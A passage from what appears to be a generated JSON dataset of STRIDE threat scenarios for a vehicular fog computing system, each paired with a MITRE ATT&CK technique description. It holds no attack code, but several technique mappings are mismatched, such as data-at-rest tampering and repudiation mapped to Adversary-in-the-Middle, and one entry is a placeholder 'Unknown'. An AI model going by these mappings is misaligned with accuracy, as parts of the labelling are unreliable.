                "Compromised Device",
                "RSU"
            ],
            "mitre_technique": {
                "name": "Multi-hop Proxy",
                "description": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\n\nFor example, adversaries may construct or use onion routing networks \u2013 such as the publicly available [Tor](https://attack.mitre.org/software/S0183) network \u2013 to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.(Citation: Onion Routing)\n\nIn the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., [Network Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization\u2019s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.\n\nSimilarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.(Citation: NGLite Trojan)",
                "id": "attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d",
                "technique_id": "T1090.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could overwhelm fog nodes with excessive data, causing service unavailability.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not have sufficient DDOS protection mechanisms.",
                    "Role": "Fog nodes",
                    "Condition": "Lack of rate limiting and anomaly detection."
                },
                {
                    "Assumption": "Multiple entry points can be exploited to inject large volumes of data.",
                    "Role": "System Architecture",
                    "Condition": "Weak rate-limiting controls."
                }
            ],
            "Potential Impact": "Temporary or prolonged unavailability of services.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "Service Unavailability",
                "Flood Attack"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers could perform a DDOS attack on the cloud layer, disrupting data analysis and storage activities.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are accessible without robust load-balancing mechanisms.",
                    "Role": "Cloud Services",
                    "Condition": "Inadequate load balancing and failover strategies."
                },
                {
                    "Assumption": "Cloud-based DDOS protection services are not in place or are insufficient.",
                    "Role": "Cloud Infrastructure",
                    "Condition": "Weak or no DDOS mitigation systems."
                }
            ],
            "Potential Impact": "Disruption to critical data analysis and storage functions.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "Cloud Service Disruption",
                "Availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Compromised roadside units (RSUs) could be used to disrupt the VFC system by sending false alerts.",
            "Assumptions": [
                {
                    "Assumption": "RSUs can send alerts without filter or authentication checks.",
                    "Role": "RSU",
                    "Condition": "No authentication and validation on alert messages."
                },
                {
                    "Assumption": "Fog nodes and central systems process and act upon those alerts immediately.",
                    "Role": "Fog nodes and Central Systems",
                    "Condition": "Automated alert handling without validation."
                }
            ],
            "Potential Impact": "Disruption in real-time traffic management services.",
            "MITRE ATT&CK Keywords": [
                "Compromised Device",
                "Alert Flooding",
                "Service Disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could escalate privileges in the cloud service to access restricted administrative functions.",
            "Assumptions": [
                {
                    "Assumption": "The cloud service has vulnerabilities that allow privilege escalation.",
                    "Role": "Cloud Services",
                    "Condition": "Unpatched system vulnerabilities."
                },
                {
                    "Assumption": "Role-based access control is not strictly enforced.",
                    "Role": "System Administration",
                    "Condition": "Weak role definitions and enforcement."
                }
            ],
            "Potential Impact": "Unauthorized administrative access and potential system-wide control.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Cloud",
                "Administrative Access"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit weak access control mechanisms on fog nodes to gain higher-level access.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes operate with weak or default access credentials.",
                    "Role": "Fog nodes",
                    "Condition": "Inadequate credential management."
                },
                {
                    "Assumption": "No additional authorization layers are in place for critical operations.",
                    "Role": "System",
                    "Condition": "Lack of multi-factor authentication."
                }
            ],
            "Potential Impact": "Compromised fog nodes leading to broader network access.",
            "MITRE ATT&CK Keywords": [
                "Access Control",
                "Fog Nodes",
                "Credential Exploitation"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attackers could leverage vulnerabilities in RSU firmware to execute privileged commands.",
            "Assumptions": [
                {
                    "Assumption": "RSU firmware is vulnerable and does not have latest security patches.",
                    "Role": "RSU",
                    "Condition": "Firmware contains known vulnerabilities."
                },
                {
                    "Assumption": "RSU allows execution of commands without strict privilege checks.",
                    "Role": "RSU",
                    "Condition": "Lack of command level security checks."
                }
            ],
            "Potential Impact": "Unauthorized control over RSU functionalities and data.",
            "MITRE ATT&CK Keywords": [
                "Vulnerability Exploitation",
                "RSU",
                "Firmware"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "25",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate smart vehicle to access fog node services.",
            "Assumptions": [
                {
                    "Assumption": "Lack of robust mutual authentication between smart vehicles and fog nodes",
                    "Role": "System Architect",
                    "Condition": "Occurs if mutual authentication mechanisms are not implemented."
                },
                {
                    "Assumption": "Presence of insecure communication channels between smart vehicles and fog nodes",
                    "Role": "Network Engineer",
                    "Condition": "Occurs if communication encryption is not enforced."
                }
            ],
            "Potential Impact": "Unauthorized access, data leakage, and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "network",
                "device impersonation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a rogue fog node to impersonate legitimate RSUs and gathers data from vehicles.",
            "Assumptions": [
                {
                    "Assumption": "Weak verification mechanisms for fog nodes by smart vehicles",
                    "Role": "System Developer",
                    "Condition": "Occurs if there are no verification protocols."
                },
                {
                    "Assumption": "Unsecured physical access to deploy rogue fog nodes",
                    "Role": "Physical Security Specialist",
                    "Condition": "Occurs if physical security controls are inadequate."
                }
            ],
            "Potential Impact": "Data confidentiality breach and potential vehicle tracking.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "rogue device",
                "data gathering"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker fakes the identity of cloud services to mislead fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Absence of strong identity verification for cloud services by fog nodes",
                    "Role": "Cloud Engineer",
                    "Condition": "Occurs if cloud service verification processes lack robustness."
                },
                {
                    "Assumption": "Inadequate encryption for communication between fog nodes and cloud services",
                    "Role": "Network Security Engineer",
                    "Condition": "Occurs if encryption standards are not upheld."
                }
            ],
            "Potential Impact": "Fog node manipulation, data integrity loss, and disruption of services.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud",
                "network",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters data flowing from smart vehicles to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not adequately encrypted",
                    "Role": "Network Administrator",
                    "Condition": "Occurs if encryption protocols are weak or absent."
                },
                {
                    "Assumption": "No data integrity checks implemented during transmission",
                    "Role": "System Integrator",
                    "Condition": "Occurs if checksums or hash techniques are not used."
                }
            ],
            "Potential Impact": "Data integrity issues leading to incorrect decision making by fog nodes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "network",
                "injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on fog nodes to alter their behavior.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient security controls on firmware updates",
                    "Role": "Firmware Developer",
                    "Condition": "Occurs if secure boot or signed firmware updates are not enforced."
                },
                {
                    "Assumption": "Physical access to fog nodes is unprotected",
                    "Role": "Physical Security Specialist",
                    "Condition": "Occurs if fog nodes are not in secure locations."
                }
            ],
            "Potential Impact": "System integrity compromised and rogue operations by fog nodes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "device",
                "malware"
            ],
            "mitre_technique": {
                "name": "Bootkit",
                "description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "id": "attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d",
                "technique_id": "T1067"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters data stored in fog nodes to disrupt service accuracy.",
            "Assumptions": [
                {
                    "Assumption": "Lack of data at rest encryption within fog nodes",
                    "Role": "Data Security Specialist",
                    "Condition": "Occurs if no encryption is used for local storage."
                },
                {
                    "Assumption": "Insufficient access controls to local data storage on fog nodes",
                    "Role": "System Administrator",
                    "Condition": "Occurs if access permissions are not correctly configured."
                }
            ],
            "Potential Impact": "Data tampering leads to degraded service performance and incorrect analytics.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data storage",
                "data integrity",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending altered data from a smart vehicle to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Absence of non-repudiation mechanisms in communication logs",
                    "Role": "System Architect",
                    "Condition": "Occurs if actions are not logged or digitally signed."
                },
                {
                    "Assumption": "No authentication tags attached to data packets",
                    "Role": "Network Engineer",
                    "Condition": "Occurs if data packets lack secure authentication tags."
                }
            ],
            "Potential Impact": "Difficulty in tracking malicious activities and weakened trust in system data.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "communication",
                "data logs",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies initiating a command that caused disruption in the fog node services.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate logging of user actions within the system",
                    "Role": "Security Analyst",
                    "Condition": "Occurs if logging mechanisms are insufficient or logs are not immutable."
                },
                {
                    "Assumption": "Absence of multi-factor authentication to validate user actions",
                    "Role": "System Administrator",
                    "Condition": "Occurs if authentication is weak and lacking in redundancy."
                }
            ],
            "Potential Impact": "System operation disputes and accountability issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user access",
                "logs",
                "multi-factor authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Fog node operator denies making a configuration change that impacted vehicle data processing.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient change management logs for configuration changes",
                    "Role": "IT Manager",
                    "Condition": "Occurs if configuration changes are not systematically logged and managed."
                },
                {
                    "Assumption": "Lack of audit trails for operator actions",
                    "Role": "Security Auditor",
                    "Condition": "Occurs if there is no mechanism verifying operator activities."
                }
            ],
            "Potential Impact": "Change tracing difficulties leading to management challenges and service reliability concerns.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration change",
                "logs",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker eavesdrops on data transmissions between vehicles and fog nodes.",
